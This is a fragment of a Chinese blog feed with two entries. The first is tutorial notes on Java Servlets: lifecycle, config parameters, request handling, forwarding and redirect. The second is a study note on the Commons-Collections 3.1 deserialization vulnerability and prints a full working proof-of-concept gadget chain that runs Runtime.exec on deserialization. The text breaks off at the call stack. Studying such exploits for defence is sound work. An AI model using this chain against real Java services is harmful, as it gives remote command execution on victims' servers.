title="servlet生命周期"></a>servlet生命周期</h2><p>一个servlet只会在tomcat容器中实例化一次，且只会产生一个对象，常驻内存，要等到服务器关闭才会销毁。tomcat对它做了多线程处理，这样才能实现一个对象多个请求</p><p>init：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">初始化方法，用户第1次访问的时候会执行1次<br></code></pre></td></tr></table></figure><p>service ：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">处理服务请求的方法，每次请求都会执行<br></code></pre></td></tr></table></figure><p>destory：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">销毁方法，服务器关闭的时候执行1次<br></code></pre></td></tr></table></figure><p>继承Servlet类并重写三个方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.myServlet;<br><br><span class="hljs-keyword">import</span> javax.servlet.*;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ServletDemo</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Servlet</span> </span>&#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">init</span><span class="hljs-params">(ServletConfig servletConfig)</span> <span class="hljs-keyword">throws</span> ServletException</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;init&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> ServletConfig <span class="hljs-title">getServletConfig</span><span class="hljs-params">()</span></span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">service</span><span class="hljs-params">(ServletRequest servletRequest, ServletResponse servletResponse)</span> <span class="hljs-keyword">throws</span>  ServletException, IOException</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;service&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getServletInfo</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">destroy</span><span class="hljs-params">()</span></span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;destroy&quot;</span>);<br>    &#125;<br><br><br>&#125;<br><br></code></pre></td></tr></table></figure><p>访问页面后，可以看到执行了service方法</p><p><img src="https://www.hualigs.cn/image/60a9f8e4f3c1e.jpg"></p><h1 id="ServletConfig接口"><a href="#ServletConfig接口" class="headerlink" title="ServletConfig接口"></a>ServletConfig接口</h1><p>在Servlet的配置文件web.xml中，可以使用一个或多个<code>&lt;init-param&gt;</code>标签为servlet配置一些初始化参数。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">servlet</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>mytest<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-class</span>&gt;</span>com.example.myServlet.ConfigServlet<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-class</span>&gt;</span><br>        <br>        <span class="hljs-tag">&lt;<span class="hljs-name">init-param</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">param-name</span>&gt;</span>name<span class="hljs-tag">&lt;/<span class="hljs-name">param-name</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">param-value</span>&gt;</span>admin<span class="hljs-tag">&lt;/<span class="hljs-name">param-value</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">init-param</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">init-param</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">param-name</span>&gt;</span>password<span class="hljs-tag">&lt;/<span class="hljs-name">param-name</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">param-value</span>&gt;</span>123456<span class="hljs-tag">&lt;/<span class="hljs-name">param-value</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">init-param</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">servlet</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet-mapping</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>mytest<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>/mytest<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">servlet-mapping</span>&gt;</span><br></code></pre></td></tr></table></figure><p>getInitParameter(“参数”) 通过参数名，得到文件中参数值</p><p>getInitParameterNames() 得到所有参数名字</p><p>tomcat在创建Servlet实例时会自动把上面的初始化参数封装对ServletConfig对象中，并在调用init方法时，把ServletConfig对象传递给servlet。通过ServletConfig对象就可以得到当前servlet的初始化参数信息。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.myServlet;<br><br><span class="hljs-keyword">import</span> javax.servlet.ServletException;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServlet;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.PrintWriter;<br><span class="hljs-keyword">import</span> java.util.Enumeration;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ConfigServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">HttpServlet</span> </span>&#123;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">doGet</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException</span>&#123;<br>        resp.setContentType(<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>);<br>        PrintWriter writer=resp.getWriter();<br>        String name=getInitParameter(<span class="hljs-string">&quot;name&quot;</span>);<br><br>        writer.println(name);<br><br>        Enumeration initParameterNames=getInitParameterNames();<br><br>        <span class="hljs-keyword">while</span> (initParameterNames.hasMoreElements())&#123;<br><br>            String element= (String) initParameterNames.nextElement();<br>            String value=getInitParameter(element);<br>            writer.println(<span class="hljs-string">&quot;参数名:&quot;</span>+element+<span class="hljs-string">&quot;值:&quot;</span>+value);<br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>成功获取到了配置的信息</p><p><img src="https://www.hualigs.cn/image/60a9f8e50c871.jpg"></p><h1 id="HttpServletRequest-对象"><a href="#HttpServletRequest-对象" class="headerlink" title="HttpServletRequest 对象"></a>HttpServletRequest 对象</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.myServlet;<br><br><span class="hljs-keyword">import</span> javax.servlet.ServletException;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServlet;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.PrintWriter;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HttpServletRequestDemo</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">HttpServlet</span> </span>&#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">doGet</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> ServletException, IOException</span>&#123;<br>        response.setContentType((<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>));<br>        PrintWriter writer=response.getWriter();<br><br>        writer.println(request.getMethod());  <span class="hljs-comment">//请求方式</span><br>        writer.println(request.getRequestURI()); <span class="hljs-comment">//请求URL</span><br>        writer.println(request.getProtocol()); <span class="hljs-comment">//请求协议</span><br>        writer.println(request.getQueryString()); <span class="hljs-comment">//查询字符</span><br>        writer.println(request.getHeader(<span class="hljs-string">&quot;user-agent&quot;</span>)); <span class="hljs-comment">//获取UA</span><br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>效果</p><p><img src="https://www.hualigs.cn/image/60a9f8e577f11.jpg"></p><h2 id="BeanUtils"><a href="#BeanUtils" class="headerlink" title="BeanUtils"></a>BeanUtils</h2><p>BeanUtils是apache commons 组件的成员之一，用于简化javaBean封装数据的操作。也就是说可以简化获取参数的方式</p><p>先导入包</p><p><img src="https://www.hualigs.cn/image/60a9f8e5ce90c.jpg"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.myServlet;<br><br><span class="hljs-keyword">import</span> org.apache.commons.beanutils.BeanUtils;<br><br><span class="hljs-keyword">import</span> javax.servlet.ServletException;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServlet;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.PrintWriter;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span></span>&#123;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> String sex;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span> age;<br><br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HttpServletRequestDemo</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">HttpServlet</span> </span>&#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">doGet</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> ServletException, IOException </span>&#123;<br>        response.setContentType((<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>));<br>        PrintWriter writer = response.getWriter();<br><br>        Map parameterMap = request.getParameterMap();<br>        User user = <span class="hljs-keyword">new</span> User();<br>        <span class="hljs-keyword">try</span>&#123;<br>            BeanUtils.populate(user,parameterMap);<br>        &#125;<span class="hljs-keyword">catch</span> (IllegalAccessException e)&#123;<br>            e.printStackTrace();<br>        &#125;<span class="hljs-keyword">catch</span> (InvocationTargetException e)&#123;<br>            e.printStackTrace();<br>        &#125;<br>        writer.println(user);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h1 id="作用域"><a href="#作用域" class="headerlink" title="作用域"></a>作用域</h1><p>sevlet中的请求会根据作用域的范围分为请求域、会话域、上下文域</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plain">请求域：一个用户的一次请求<br>会话域：一个用户的所有请求<br>上下文域：所有用户的所有请求<br></code></pre></td></tr></table></figure><p>范围大小</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">请求域 &lt; 会话域 &lt; 上下文域<br></code></pre></td></tr></table></figure><p>作用域存值</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">setAttritube</span><span class="hljs-params">(<span class="hljs-string">&quot;键&quot;</span>，“值”)</span></span> <br></code></pre></td></tr></table></figure><p>取值</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">getAttritube</span><span class="hljs-params">(<span class="hljs-string">&quot;键&quot;</span>)</span></span> <br></code></pre></td></tr></table></figure><p>删除</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-comment">removeAttritube(&quot;键&quot;)</span><br></code></pre></td></tr></table></figure><h2 id="转发"><a href="#转发" class="headerlink" title="转发"></a>转发</h2><p>实现页面跳转，从一个servlet跳转到另一个servlet</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HttpServletRequestDemo</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">HttpServlet</span> </span>&#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">doGet</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> ServletException, IOException </span>&#123;<br>        response.setContentType((<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>));<br>        RequestDispatcher requestDispatcher=request.getRequestDispatcher(<span class="hljs-string">&quot;demo&quot;</span>);<br>        requestDispatcher.forward(request,response);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>跳转到demo</p><p><img src="https://www.hualigs.cn/image/60a9f8e5d85a0.jpg"></p><p>转发的特点：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plain">1.地址栏不会发生变化，显示的还是上一个servlet的地址<br>2.一共只有一次请求：请求不断链<br>3.请求域中数据不会丢失：还是要满足请求不断链。<br>4.转发中，是一次请求的<br></code></pre></td></tr></table></figure><h2 id="重定向"><a href="#重定向" class="headerlink" title="重定向"></a>重定向</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HttpServletRequestDemo</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">HttpServlet</span> </span>&#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">doGet</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> ServletException, IOException </span>&#123;<br>        response.sendRedirect(<span class="hljs-string">&quot;demo&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>效果</p><p><img src="https://www.hualigs.cn/image/60a9f8e639c19.jpg"></p><p>重定向的特点：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>.地址栏：有变化，显示新的地址<br><span class="hljs-attribute">2</span>.<span class="hljs-number">2</span>次请求<br><span class="hljs-attribute">3</span>.请求域中的数据：断链就数据丢失了<br><span class="hljs-attribute">4</span>.重定向的根目录是：http://localhost:<span class="hljs-number">8080</span>/不包含项目的访问地址<br></code></pre></td></tr></table></figure><h1 id="HttpServletResponse"><a href="#HttpServletResponse" class="headerlink" title="HttpServletResponse"></a>HttpServletResponse</h1><p>设置响应的状态码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.myServlet;<br><br><span class="hljs-keyword">import</span> javax.servlet.ServletException;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServlet;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ResponseDemo</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">HttpServlet</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">doGet</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> ServletException, IOException </span>&#123;<br>        response.setStatus(<span class="hljs-number">200</span>);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>java反序列化学习-CommonsCollections3.1</title>
    <link href="/2021/04/30/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0-CommonsCollections3-1/"/>
    <url>/2021/04/30/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0-CommonsCollections3-1/</url>
    
    <content type="html"><![CDATA[<h1 id="commons-collections-3-1"><a href="#commons-collections-3-1" class="headerlink" title="commons-collections-3.1"></a>commons-collections-3.1</h1><p>Java commons-collections是JDK 1.2中的一个主要新增部分。它添加了许多强大的数据结构，可以加速大多数重要Java应用程序的开发。从那时起，它已经成为Java中公认的集合处理标准。</p><p>Commons Collections实现了一个TransformedMap类，该类是对Java标准数据结构Map接口的一个扩展</p><p>该类可以在一个元素被加入到集合内时，自动对该元素进行特定的修饰变换，具体的变换逻辑由Transformer类定义，Transformer在TransformedMap实例化时作为参数传入</p><p>选择版本为3.1，<a href="https://archive.apache.org/dist/commons/collections/">下载地址</a>,</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>    <span class="hljs-comment">&lt;!-- https://mvnrepository.com/artifact/commons-collections/commons-collections --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br><br></code></pre></td></tr></table></figure><h1 id="poc执行过程"><a href="#poc执行过程" class="headerlink" title="poc执行过程"></a>poc执行过程</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.commons.collections.*;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><br><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.annotation.Target;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Commons_collections_Test</span> </span>&#123;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        <span class="hljs-comment">//1.客户端构建攻击代码</span><br>        <span class="hljs-comment">//此处构建了一个transformers的数组，在其中构建了任意函数执行的核心代码</span><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> Transformer[] &#123;<br>                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> Class[] &#123;String.class, Class[].class &#125;, <span class="hljs-keyword">new</span> Object[] &#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> Class[<span class="hljs-number">0</span>] &#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> Class[] &#123;Object.class, Object[].class &#125;, <span class="hljs-keyword">new</span> Object[] &#123;<span class="hljs-keyword">null</span>, <span class="hljs-keyword">new</span> Object[<span class="hljs-number">0</span>] &#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> Class[] &#123;String.class &#125;, <span class="hljs-keyword">new</span> Object[] &#123;<span class="hljs-string">&quot;calc.exe&quot;</span>&#125;)<br>        &#125;;<br>        <span class="hljs-comment">//将transformers数组存入ChaniedTransformer这个继承类</span><br>        Transformer transformerChain = <span class="hljs-keyword">new</span> ChainedTransformer(transformers);<br><br>        <span class="hljs-comment">//创建Map并绑定transformerChain</span><br>        Map innerMap = <span class="hljs-keyword">new</span> HashMap();<br>        innerMap.put(<span class="hljs-string">&quot;value&quot;</span>, <span class="hljs-string">&quot;value&quot;</span>);<br>        <span class="hljs-comment">//给予map数据转化链</span><br>        Map outerMap = TransformedMap.decorate(innerMap, <span class="hljs-keyword">null</span>, transformerChain);<br>        <span class="hljs-comment">//反射机制调用AnnotationInvocationHandler类的构造函数</span><br>        Class cl = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor ctor = cl.getDeclaredConstructor(Class.class, Map.class);<br>        <span class="hljs-comment">//取消构造函数修饰符限制</span><br>        ctor.setAccessible(<span class="hljs-keyword">true</span>);<br>        <span class="hljs-comment">//获取AnnotationInvocationHandler类实例</span><br>        Object instance = ctor.newInstance(Target.class, outerMap);<br><br>        <span class="hljs-comment">//payload序列化写入文件，模拟网络传输</span><br>        FileOutputStream f = <span class="hljs-keyword">new</span> FileOutputStream(<span class="hljs-string">&quot;payload.bin&quot;</span>);<br>        ObjectOutputStream fout = <span class="hljs-keyword">new</span> ObjectOutputStream(f);<br>        fout.writeObject(instance);<br><br>        <span class="hljs-comment">//2.服务端读取文件，反序列化，模拟网络传输</span><br>        FileInputStream fi = <span class="hljs-keyword">new</span> FileInputStream(<span class="hljs-string">&quot;payload.bin&quot;</span>);<br>        ObjectInputStream fin = <span class="hljs-keyword">new</span> ObjectInputStream(fi);<br>        <span class="hljs-comment">//服务端反序列化</span><br>        fin.readObject();<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>调用栈</p><p><a 